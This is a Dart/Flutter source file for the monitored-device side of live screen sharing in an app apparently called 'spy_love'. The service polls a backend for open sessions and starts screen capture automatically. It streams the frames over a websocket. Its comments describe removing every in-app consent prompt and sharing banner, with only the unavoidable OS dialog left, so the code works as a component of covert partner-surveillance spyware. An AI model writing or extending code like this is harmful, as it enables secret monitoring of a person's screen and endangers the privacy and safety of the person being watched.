import 'dart:async';
import 'dart:io' show Platform;

import 'package:flutter/foundation.dart';
import 'package:spy_love/features/monitoring/screen_share/screen_capture_bridge.dart';
import 'package:spy_love/core/network/screen_stream_client.dart';
import 'package:spy_love/features/monitoring/screen_share/screen_share_session.dart';
import 'package:spy_love/features/monitoring/screen_share/screen_share_repository.dart';

/// Monitored-device side of consent-scoped live screen sharing.
///
/// Silent MDM model (enrollment scopes already disclose access):
///   1. an active, revocable `screen` consent scope (enforced server-side on
///      request/start and on the WS consumer, and checked locally before
///      capture when the backend reports the device's scopes), and sharing must
///      not be paused;
///   2. the OS MediaProjection / ReplayKit grant — Android/iOS still require
///      this system dialog; it cannot be skipped;
///   3. no in-app Allow/Deny prompt and no app-owned "sharing" banner (the OS
///      cast indicator / FGS notification remains unavoidable).
///
/// The service polls for open sessions and begins capture without a local
/// approval UI when the enrollment scope is present.
class ScreenShareService extends ChangeNotifier {
  ScreenShareService(this._repo);

  final ScreenShareRepository _repo;

  ScreenStreamClient? _stream;
  StreamSubscription<Map<String, dynamic>>? _frameSub;
  Timer? _pollTimer;
  Timer? _iosStartTimeout;
  String? _deviceId;

  ScreenShareSession? _session;
  bool _sharing = false;
  bool _supported = true;
  bool _pollInFlight = false;
  bool _acceptInFlight = false;

  /// Bumped when capture is torn down so an in-flight Allow dialog cannot
  /// start the OS prompt after stop/logout.
  int _epoch = 0;

  bool get isSharing => _sharing;
  bool get isSupported => _supported;
  ScreenShareSession? get session => _session;

  bool get _isIOS => !kIsWeb && Platform.isIOS;

  /// Starts polling for incoming screen-share requests for this device.
  /// Safe to call on monitored-device startup; no capture happens until the
  /// user grants the OS prompt.
  void watchForRequests(
    String deviceId,
    ScreenStreamClient streamClient, {
    Duration interval = const Duration(seconds: 5),
  }) {
    _deviceId = deviceId;
    _stream = streamClient;
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(interval, (_) => _poll());
    unawaited(_poll());
  }

  Future<void> _poll() async {
    if (_pollInFlight || _acceptInFlight || _sharing) return;
    final deviceId = _deviceId;
    if (deviceId == null) return;
    _pollInFlight = true;
    try {
      final result = await _repo.pendingForOwner(deviceId);
      if (_acceptInFlight || _sharing) return;
      if (result.isRight) return;
      final pending = result.left;
      if (pending == null) return;
      // Backend opens as ACTIVE when `screen` scope is enrolled; also handle
      // legacy `requested` rows during rollout.
      if (pending.status != 'requested' && pending.status != 'active') return;
      await accept(pending);
    } finally {
      _pollInFlight = false;
    }
  }

  /// Silently answers an open session: verifies the `screen` scope locally when
  /// reported, prompts the OS MediaProjection / ReplayKit grant, starts capture,
  /// and begins streaming frames. Returns false (and declines/ends the session
  /// server-side) if consent is missing or capture fails.
  ///
  /// A second call while the OS prompt is up returns false without touching the
  /// in-flight request.
  Future<bool> accept(ScreenShareSession pending) async {
    if (_sharing || _acceptInFlight) return false;
    _acceptInFlight = true;
    final epoch = _epoch;
    try {
      return await _acceptCurrent(pending, epoch);
    } finally {
      _acceptInFlight = false;
    }
  }

  Future<bool> _acceptCurrent(ScreenShareSession pending, int epoch) async {
    // (b) Local, defence-in-depth consent check: if the backend reported the
    // device's active scopes and `screen` is not among them, decline without
    // ever raising the OS prompt. (The server also enforces this.)
    if (pending.hasConsentInfo && !pending.localScreenConsentActive) {
      await _repo.denySession(pending.id);
      notifyListeners();
      return false;
    }
    if (epoch != _epoch) return false;

    // No in-app Allow/Deny — enrollment `screen` scope already covers disclosure.
    // Android/iOS still show the system MediaProjection / ReplayKit dialog.

    _supported = await ScreenCaptureBridge.isSupported();
    if (epoch != _epoch) return false;
    if (!_supported) {
      await _repo.denySession(pending.id);
      notifyListeners();
      return false;
    }

    final granted = await ScreenCaptureBridge.startCapture();
    if (epoch != _epoch) {
      if (granted) await ScreenCaptureBridge.stopCapture();
      return false;
    }
    if (!granted) {
      await _repo.denySession(pending.id);
      return false;
    }

    final started = await _repo.startSession(pending.id);
    if (epoch != _epoch) {
      await ScreenCaptureBridge.stopCapture();
      return false;
    }
    if (started.isRight) {
      // M4: don't leave the request dangling in `requested` after a failed
      // start — tear capture down and decline server-side.
      await ScreenCaptureBridge.stopCapture();
      await _repo.denySession(pending.id);
      return false;
    }
    _session = started.left;

    final stream = _stream;
    if (stream == null) {
      await _endAndTeardown(reason: 'no_transport');
      return false;
    }

    final connected = await stream.connect(
      _session!.wsPath,
      onSignal: (message) {
        // Control payload is nested under `data` (survives the backend relay).
        final data = message['data'];
        final signal = data is Map ? data['signal'] : null;
        if (signal == 'ended' || signal == 'paused') {
          unawaited(stop(reason: signal as String?));
        }
      },
      onClosed: () => unawaited(stop(reason: 'socket_closed')),
    );
    if (epoch != _epoch) {
      await _endAndTeardown(reason: 'superseded');
      return false;
    }
    if (!connected) {
      await _endAndTeardown(reason: 'connect_failed');
      return false;
    }

    _frameSub = ScreenCaptureBridge.frameStream.listen((frame) {
      // M1: on iOS the active state must be driven by the real broadcast, not
      // by picker presentation. The native plugin emits a `broadcastStarted`
      // control event, and real frames only ever flow after the OS grant — both
      // confirm that sharing genuinely started.
      if (frame['event'] == 'broadcastStarted') {
        _confirmSharing();
        return;
      }
      final image = frame['image'];
      if (image is! String) return;
      if (!_sharing) _confirmSharing();
      stream.sendFrame(
        jpegBase64: image,
        width: (frame['w'] as num?)?.toInt() ?? 0,
        height: (frame['h'] as num?)?.toInt() ?? 0,
      );
    });

    if (_isIOS) {
      // ReplayKit reports success on PICKER PRESENTATION, not on grant, so defer
      // the active state / red banner until the broadcast actually starts. If it
      // never starts (e.g. the user cancelled the picker), end the otherwise
      // dangling `active` session.
      _iosStartTimeout?.cancel();
      _iosStartTimeout = Timer(const Duration(seconds: 15), () {
        if (!_sharing) unawaited(stop(reason: 'broadcast_not_started'));
      });
    } else {
      // Android: a true return from startCapture means the MediaProjection grant
      // succeeded, so capture is really running.
      _confirmSharing();
    }
    return true;
  }

  void _confirmSharing() {
    _iosStartTimeout?.cancel();
    _iosStartTimeout = null;
    if (_sharing) return;
    _sharing = true;
    notifyListeners();
  }

  /// Stops sharing: tears down capture, closes the socket, and ends the
  /// session server-side (audited).
  Future<void> stop({String? reason}) async {
    final session = _session;
    await _teardown(reason: reason);
    if (session != null) {
      await _repo.endSession(session.id, reason: reason ?? 'owner_stopped');
    }
  }

  /// Tears capture down AND ends the session server-side, for failure paths
  /// after the session was already started (so it never dangles as `active`).
  Future<void> _endAndTeardown({String? reason}) async {
    final session = _session;
    await _teardown(reason: reason);
    if (session != null) {
      await _repo.endSession(session.id, reason: reason ?? 'teardown');
    }
  }

  Future<void> _teardown({String? reason}) async {
    _epoch++;
    _iosStartTimeout?.cancel();
    _iosStartTimeout = null;
    await _frameSub?.cancel();
    _frameSub = null;
    await ScreenCaptureBridge.stopCapture();
    await _stream?.close();
    _sharing = false;
    _session = null;
    notifyListeners();
  }

  @override
  void dispose() {
    _pollTimer?.cancel();
    _iosStartTimeout?.cancel();
    unawaited(_frameSub?.cancel());
    unawaited(_stream?.close());
    super.dispose();
  }
}
